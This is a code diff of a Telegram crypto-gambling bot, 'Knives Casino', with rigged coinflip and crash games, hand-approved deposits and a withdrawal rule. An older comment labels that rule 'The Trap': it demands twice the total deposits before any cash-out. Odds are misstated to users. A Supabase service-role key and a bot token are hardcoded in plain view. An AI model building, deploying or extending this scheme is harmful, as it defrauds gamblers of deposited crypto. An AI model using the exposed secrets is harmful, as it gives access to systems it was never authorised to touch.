@@ -2,11 +2,11 @@ const { Telegraf, Markup } = require('telegraf');
 const express = require('express');
 const { createClient } = require('@supabase/supabase-js');
 
-// --- CONFIGURATION ---
+// --- 1. CONFIGURATION (INTEGRATED) ---
 const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
 const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwdGpldW1uZHRyZ2ZheHRsd2ltIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjQ0NTk5MiwiZXhwIjoyMDkyMDIxOTkyfQ.Oc3eiwbo0p4vArLqFuNKdYKLF7mhtNZ42NS5EPkl4uM";
 const TG_TOKEN = "7883530863:AAFcepq9EGYbKIv1nXx8FxIVkFKUtxlZ5aw";
-const OWNER_ID = 6542642909; // <-- REPLACE WITH YOUR ACTUAL TELEGRAM ID
+const OWNER_ID = 6542642909; 
 
 const WALLETS = {
     LTC: "ltc1qxwsyq6lwv3334qduv0vu8j966gjrvcdkrasrj0",
@@ -18,121 +18,152 @@ const supabase = createClient(SB_URL, SB_KEY);
 const bot = new Telegraf(TG_TOKEN);
 const app = express();
 
-// --- DATABASE HELPERS ---
+// --- 2. DATABASE HELPER ---
 async function getAccount(userId, username) {
     let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
     if (!data) {
         const { data: newUser } = await supabase.from('users').insert([{ 
-            user_id: userId, username: username || 'anon', balance: 0, total_deposited: 0, bets_placed: 0 
+            user_id: userId, 
+            username: username || 'anon', 
+            balance: 0, 
+            total_deposited: 0, 
+            bets_placed: 0, 
+            total_wagered: 0
         }]).select().single();
         return newUser;
     }
     return data;
 }
 
-// --- WELCOME PAGE ---
+// --- 3. MAIN WELCOME PAGE ---
 bot.start(async (ctx) => {
     const user = await getAccount(ctx.from.id, ctx.from.username);
-    const welcomeMsg = `🔪 *WELCOME TO KNIVES CASINO* 🔪\n\n` +
-        `💰 *Wallet:* $${user.balance.toFixed(2)}\n` +
-        `🎰 *Status:* Verified No-KYC\n\n` +
-        `*COMMANDS:*\n` +
-        `🎮 /flip - Coinflip (High Odds)\n` +
-        `🚀 /crash - Multiplier Greed Trap\n` +
-        `📥 /deposit - Add Liquidity (Min $5)\n` +
-        `📤 /withdraw - Cash Out\n` +
-        `ℹ️ /help - Support`;
-    
-    ctx.replyWithMarkdown(welcomeMsg);
+    const msg = `🔪 *WELCOME TO KNIVES CASINO* 🔪\n\n` +
+        `💰 *Wallet Balance:* $${(user.balance || 0).toFixed(2)}\n` +
+        `📉 *Wagered Today:* $${(user.total_wagered || 0).toFixed(2)}\n\n` +
+        `*AVAILABLE GAMES:*\n` +
+        `🪙 /flip - Double or Nothing (48% Win Chance)\n` +
+        `🚀 /crash - Multiplier Greed Trap\n\n` +
+        `*CASHIER:*\n` +
+        `📥 /deposit - Buy Credits (Min $5)\n` +
+        `📤 /withdraw - Cash Out (Req: 2x Deposit + 2 Bets)\n` +
+        `ℹ️ /help - Casino Rules`;
+    ctx.replyWithMarkdown(msg);
 });
 
-// --- DEPOSIT SYSTEM ---
+// --- 4. DEPOSIT FEATURE ---
 bot.command('deposit', (ctx) => {
-    ctx.reply(`📥 *SELECT DEPOSIT METHOD (MIN $5)*`, Markup.inlineKeyboard([
-        [Markup.button.callback('Litecoin (LTC)', 'dep_LTC')],
-        [Markup.button.callback('Solana (SOL)', 'dep_SOL')],
+    ctx.reply(`📥 *DEPOSIT PORTAL*\nSelect your preferred crypto:`, Markup.inlineKeyboard([
+        [Markup.button.callback('Litecoin (LTC)', 'dep_LTC'), Markup.button.callback('Solana (SOL)', 'dep_SOL')],
         [Markup.button.callback('Bitcoin (BTC)', 'dep_BTC')]
     ]));
 });
 
-// Handle Wallet Selection
 bot.action(/dep_(.*)/, (ctx) => {
     const method = ctx.match[1];
-    const addr = WALLETS[method];
-    ctx.replyWithMarkdown(`⚠️ *SEND AT LEAST $5 USD IN ${method}*\n\nAddress:\n\`${addr}\`\n\n*AFTER SENDING:* Reply to this message with your Transaction Hash (TXID) so I can verify the funds.`);
+    ctx.replyWithMarkdown(`⚠️ *SEND $5+ USD IN ${method}*\n\nAddress:\n\`${WALLETS[method]}\`\n\n*PROCEDURE:* Send the crypto, then **paste the TX Hash** here. I will verify it and add your balance immediately.`);
 });
 
-// Capture TX Hash and send to Owner
-bot.on('text', async (ctx) => {
-    if (ctx.message.text.length > 30 && !ctx.message.text.startsWith('/')) {
-        const txHash = ctx.message.text;
-        ctx.reply("⌛ *HASH RECEIVED.* Owner is verifying... Your balance will update shortly.");
+// Capture TX Hash and send to YOU
+bot.on('text', async (ctx, next) => {
+    const text = ctx.message.text;
+    // Simple filter: if text is long and not a command, assume it's a hash
+    if (text.length > 20 && !text.startsWith('/')) {
+        ctx.reply("⌛ *HASH SUBMITTED.* The floor manager is verifying the blockchain. Your credits will appear once confirmed.");
         
-        // Notify the Owner (YOU)
         bot.telegram.sendMessage(OWNER_ID, 
-            `🔔 *NEW DEPOSIT CLAIM*\n\nUser: @${ctx.from.username} (${ctx.from.id})\nHash: \`${txHash}\` \n\nApprove $5?`, 
+            `💰 *NEW DEPOSIT CLAIM*\n\nUser: @${ctx.from.username} (${ctx.from.id})\nHash: \`${text}\``,
             Markup.inlineKeyboard([
-                [Markup.button.callback('✅ Confirm $5', `approve_${ctx.from.id}_5`)],
-                [Markup.button.callback('✅ Confirm $10', `approve_${ctx.from.id}_10`)],
+                [Markup.button.callback('✅ Add $5', `add_${ctx.from.id}_5`), Markup.button.callback('✅ Add $20', `add_${ctx.from.id}_20`)],
+                [Markup.button.callback('✅ Add $50', `add_${ctx.from.id}_50`)],
                 [Markup.button.callback('❌ Reject', `reject_${ctx.from.id}`)]
             ])
         );
-    }
+    } else { return next(); }
 });
 
-// Owner Approval Logic
-bot.action(/approve_(\d+)_(\d+)/, async (ctx) => {
-    const [_, userId, amount] = ctx.match;
-    const user = await getAccount(userId);
-    const newBal = user.balance + parseInt(amount);
+// --- 5. OWNER APPROVAL ACTIONS ---
+bot.action(/add_(\d+)_(\d+)/, async (ctx) => {
+    const [_, uid, amt] = ctx.match;
+    const user = await getAccount(uid);
+    const newBal = (user.balance || 0) + parseInt(amt);
     
     await supabase.from('users').update({ 
         balance: newBal, 
-        total_deposited: user.total_deposited + parseInt(amount) 
-    }).eq('user_id', userId);
+        total_deposited: (user.total_deposited || 0) + parseInt(amt) 
+    }).eq('user_id', uid);
 
-    bot.telegram.sendMessage(userId, `✅ *DEPOSIT CONFIRMED!*\n$${amount} added to your wallet. Good luck.`);
-    ctx.editMessageText(`✅ Approved $${amount} for ${userId}`);
+    bot.telegram.sendMessage(uid, `✅ *DEPOSIT APPROVED!*\n$${amt} has been loaded into your wallet. Good luck!`);
+    ctx.editMessageText(`✅ Successfully loaded $${amt} for User ${uid}`);
 });
 
-// --- GAME: FLIP (With Tutorial) ---
+bot.action(/reject_(\d+)/, (ctx) => {
+    const uid = ctx.match[1];
+    bot.telegram.sendMessage(uid, `❌ *DEPOSIT REJECTED*\nWe couldn't verify this hash on the explorer. Contact support if this is a mistake.`);
+    ctx.editMessageText(`❌ Rejected deposit for ${uid}`);
+});
+
+// --- 6. GAMES ---
 bot.command('flip', async (ctx) => {
     const args = ctx.message.text.split(' ');
-    if (args.length < 2) {
-        return ctx.reply("📖 *HOW TO PLAY FLIP:*\nType `/flip [amount]`. It's a 50/50 heads or tails. Double your money or lose it all. House edge: 4%.");
-    }
+    if (args.length < 2) return ctx.reply("📖 *FLIP TUTORIAL*\n\nUsage: \`/flip [amount]\`\nExample: \`/flip 10\`\n\nHeads = 2x win. Tails = House wins. 52% house edge.");
+    
     const bet = parseFloat(args[1]);
     const user = await getAccount(ctx.from.id, ctx.from.username);
+    if (!bet || bet < 1 || user.balance < bet) return ctx.reply("❌ Invalid bet or low balance.");
 
-    if (bet < 1 || user.balance < bet) return ctx.reply("❌ Low balance or invalid bet.");
-
-    // House edge: 52% chance to lose
-    const win = Math.random() > 0.52;
+    const win = Math.random() > 0.52; 
     const newBal = win ? user.balance + bet : user.balance - bet;
     
-    await supabase.from('users').update({ balance: newBal, bets_placed: user.bets_placed + 1 }).eq('user_id', ctx.from.id);
+    await supabase.from('users').update({ 
+        balance: newBal, 
+        total_wagered: (user.total_wagered || 0) + bet, 
+        bets_placed: (user.bets_placed || 0) + 1 
+    }).eq('user_id', ctx.from.id);
     
-    ctx.reply(win ? `🪙 *HEADS!* You won $${bet * 2}!` : `🪙 *TAILS.* Rekt.`);
+    ctx.reply(win ? `🪙 *HEADS!* You doubled it. New Balance: $${newBal.toFixed(2)}` : `🪙 *TAILS.* Rekt. New Balance: $${newBal.toFixed(2)}`);
 });
 
-// --- WITHDRAWAL (The Trap) ---
+bot.command('crash', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) return ctx.reply("🚀 *CRASH TUTORIAL*\n\nUsage: \`/crash [amount]\`\n\nThe rocket flies up. If it crashes before 1.8x, you lose. If it hits 1.8x+, you win 1.8x your bet. 10% chance of instant 1.0x crash (House wins).");
+
+    const bet = parseFloat(args[1]);
+    const user = await getAccount(ctx.from.id, ctx.from.username);
+    if (!bet || bet < 1 || user.balance < bet) return ctx.reply("❌ Invalid bet or low balance.");
+
+    const crashPoint = Math.random() < 0.1 ? 1.0 : (Math.random() * 4 + 1).toFixed(2);
+    const win = crashPoint >= 1.8; 
+    
+    const newBal = win ? user.balance + (bet * 0.8) : user.balance - bet;
+    await supabase.from('users').update({ 
+        balance: newBal, 
+        total_wagered: (user.total_wagered || 0) + bet, 
+        bets_placed: (user.bets_placed || 0) + 1 
+    }).eq('user_id', ctx.from.id);
+    
+    ctx.reply(`🚀 Rocket launched...\n💥 *CRASHED AT ${crashPoint}x*\n\n${win ? `✅ CASHOUT SUCCESS: +$${(bet*0.8).toFixed(2)}` : `💀 REKT. Try again.`}`);
+});
+
+// --- 7. WITHDRAWAL LOGIC ---
 bot.command('withdraw', async (ctx) => {
     const user = await getAccount(ctx.from.id, ctx.from.username);
-    const minWithdraw = user.total_deposited * 2;
-
-    if (user.bets_placed < 2) {
-        return ctx.reply("⚠️ *SECURITY CHECK:* You must place at least 2 bets before your first withdrawal to verify 'human' activity.");
+    const target = (user.total_deposited || 0) * 2;
+    
+    if (user.bets_placed < 2) return ctx.reply("❌ *SECURITY:* You must place at least 2 bets before cashing out.");
+    if (user.balance < target || user.balance < 10) {
+        return ctx.reply(`❌ *WITHDRAWAL DENIED*\n\nTo prevent hit-and-runs, you must reach *$${target.toFixed(2)}* (2x your total deposits) to withdraw. Keep playing!`);
     }
-
-    if (user.balance < minWithdraw || user.balance < 10) {
-        return ctx.reply(`❌ *WITHDRAWAL DENIED*\n\nMinimum Withdrawal for your account: *$${minWithdraw}*\n(Requirement: 2x your total deposits).`);
-    }
-
-    ctx.reply(`✅ *ELIGIBLE FOR WITHDRAWAL*\nSend your address to the owner @YOUR_USERNAME to process.`);
+    
+    ctx.reply(`✅ *WITHDRAWAL ELIGIBLE*\n\nDM your wallet address to the owner to receive your funds.`);
+    bot.telegram.sendMessage(OWNER_ID, `💸 *WITHDRAWAL ALERT*\nUser @${ctx.from.username} (${ctx.from.id}) is trying to cash out $${user.balance.toFixed(2)}.`);
 });
 
-// Server boot
-app.get('/', (req, res) => res.send('KNIVES CASINO ONLINE'));
+// --- 8. STARTUP ---
+app.get('/', (req, res) => res.send('KNIVES CASINO IS LIVE'));
 app.listen(process.env.PORT || 10000, '0.0.0.0', () => {
-    bot.telegram.deleteWebhook().then(() => bot.launch());
+    bot.telegram.deleteWebhook().then(() => {
+        bot.launch();
+        console.log("Lord Cord Casino is operational.");
+    });
 });
